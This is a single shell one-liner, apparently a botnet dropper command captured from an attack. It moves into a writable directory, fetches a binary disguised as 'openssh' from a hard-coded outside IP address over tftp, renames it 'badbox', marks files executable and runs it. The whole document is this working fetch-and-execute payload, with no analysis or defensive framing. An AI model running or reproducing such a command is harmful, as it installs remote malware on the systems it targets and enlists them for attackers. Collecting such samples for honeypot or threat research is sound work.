cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 107.170.213.81 -c get openssh;cat openssh >badbox;chmod +x *;./badbox
